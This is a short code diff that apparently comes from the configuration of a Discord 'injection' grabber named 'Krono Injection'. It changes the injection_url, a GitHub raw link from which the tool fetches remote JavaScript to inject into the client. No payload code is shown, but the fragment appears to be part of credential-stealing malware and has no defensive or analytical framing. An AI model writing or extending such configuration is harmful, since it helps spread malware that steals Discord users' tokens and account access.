@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Krono Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1061836269803556875/1115302542763622420/renko.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/r3nko/injection/main/index.js', 
   /**
    
    **/
